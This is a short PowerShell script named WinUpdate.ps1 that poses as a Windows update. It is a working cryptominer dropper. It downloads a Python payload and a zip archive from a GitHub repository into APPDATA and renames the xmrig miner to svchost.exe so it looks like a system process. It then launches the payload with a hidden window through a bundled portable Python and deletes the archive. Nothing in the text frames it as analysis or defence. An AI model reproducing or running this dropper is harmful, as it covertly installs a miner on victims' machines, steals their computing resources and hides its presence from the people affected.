# --- THE UNIVERSAL MASTER IGNITER (WinUpdate.ps1) ---
$ID = "svchost"
$Path = "$env:APPDATA\$ID"

# 1. Configuration
$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
$Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/Updatedata.zip"

# 2. Preparation
if (!(Test-Path $Path)) { New-Item -ItemType Directory -Path $Path -Force | Out-Null }

# 3. Deployment
Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\UpdateData.zip"

# 4. Smart Unpacking
Expand-Archive -Path "$Path\UpdateData.zip" -DestinationPath $Path -Force

# Find the Miner and pull it to the root
$Miner = Get-ChildItem -Path $Path -Filter "xmrig.exe" -Recurse | Select-Object -First 1
if ($Miner) { Move-Item -Path $Miner.FullName -Destination "$Path\$ID.exe" -Force }

# 5. Universal Activation (Using our Portable Engine)
# We find the portable pythonw.exe we just unzipped
$PortablePython = Get-ChildItem -Path $Path -Filter "pythonw.exe" -Recurse | Select-Object -First 1
if ($PortablePython -and (Test-Path "$Path\WinServices.py")) {
    Start-Process -FilePath $PortablePython.FullName -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WindowStyle Hidden
}

# Cleanup
Remove-Item -Path "$Path\UpdateData.zip"
